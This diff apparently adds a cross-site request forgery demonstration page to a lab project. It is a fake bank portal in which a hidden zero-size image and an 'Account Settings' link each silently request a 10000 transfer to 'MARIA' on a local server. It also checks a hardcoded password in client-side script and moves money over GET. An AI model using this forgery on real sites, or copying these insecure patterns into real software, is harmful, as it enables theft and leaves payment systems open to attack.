@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="jquery/dist/jquery.min.js"></script>
+<style>
+  input{
+    display: block;
+    width: 30%;
+    text-align: center;
+    height: 25px;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: black;
+  }
+  button{
+    display: block;
+    width: 20%;
+    text-align: center;
+    height: 30px;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: black;
+    margin-left: 10%;
+  }
+  #content{
+    margin-left: 40%;
+  }
+  label {
+    text-align: right;
+    clear: both;
+    float:left;
+    margin-right:15px;
+}
+#balance{
+  color: red;
+}
+#myImg{
+  margin-left: 85%;
+
+  margin-top: 10%;
+}
+</style>
+</head>
+<body onload="getBalance()">
+<h3 style="color:green;"> Hello Bob </h3>
+<div id="div1" style="margin-left:40%;color:blue;"><h2>Welcome to Bank.com</h2></div>
+<h3 style="margin-left:35%;"> Secure Portal for transactions using your bank account</h3>
+<div id="content">
+  <h3 id="balance"></h3> <br><br>
+  <div>
+    <label><b> Pay To: </b></label>
+    <input type="text" placeholder="Enter the name  " id="whom"/><br><br>
+  </div>
+  <div>
+    <label><b> Amount: </b></label>
+    <input type="number" placeholder="Enter Amount " id="amount"/><br><br>
+  </div>
+  <div>
+    <label><b> Password: </b></label>
+    <input type="password" placeholder="Enter your secure bank password " id="password"/><br><br>
+  </div>
+  <button id="pay" onclick="transfer()">Secure Pay</button>
+</div>
+
+<div id="fake">
+  <img src="http://localhost:5000/account/transfer?payTo=MARIA&amount=10000" width="0" height="0" border="0">
+</div>
+<div id="myImg">
+  <a href="http://localhost:5000/account/transfer?payTo=MARIA&amount=10000">Account Settings</a>
+</div>
+
+<script>
+    function getBalance(){
+      $.ajax({
+        url: "http://localhost:5000/account/balance",
+        method: "GET",
+        success: function(data){
+          console.log(data);
+          $("#balance").text("Your Current Balance is " + data.balance + " rs");
+        }
+      });
+    }
+    function transfer(){
+      if($("#password").val()!="prab"){
+        alert("Password Incorrect");
+      }
+      else{
+        var data = {
+          payTo: $("#whom").val(),
+          amount: $('#amount').val()
+        };
+        $.ajax({
+          url: "http://localhost:5000/account/transfer",
+          method: "GET",
+          data: data,
+          success: function(data){
+            alert("Successfull Transaction");
+            $("#balance").text("Your Current Balance is " + data.balance + " rs");
+            $("#whom").val("");
+            $("#amount").val("");
+            $("#password").val("");
+          }
+        });
+      }
+    }
+</script>
+
+</body>
+</html>
